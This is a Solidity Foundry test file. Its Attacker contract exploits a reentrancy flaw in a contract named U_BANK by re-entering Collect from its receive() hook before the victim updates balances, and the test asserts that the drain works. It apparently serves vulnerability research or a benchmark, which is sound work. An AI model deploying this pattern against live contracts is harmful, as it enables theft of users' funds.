
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK, Log} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    U_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new U_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 2 ether && attackVal < 1000 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Attacker needs to deposit >= MinSum (2 ether)
        uint256 depositAmount = attackVal;
        vm.assume(depositAmount >= 2 ether);

        _attacker.setupAttack{value: depositAmount}(depositAmount);

        // Move time forward to satisfy unlockTime condition
        vm.warp(block.timestamp + 1 days);

        _attacker.attack(depositAmount);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = U_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;

        // Deposit into the vulnerable U_BANK via Put (direct call)
        _victim.Put{value: val}(block.timestamp);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // Trigger the vulnerable Collect; this will call back into this contract
        _victim.Collect(val);

        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;

        if (attackCallCount < 2) {
            // Re-enter before the victim updates its internal balance
            _victim.Collect(storedAttackVal);
        }
    }
}
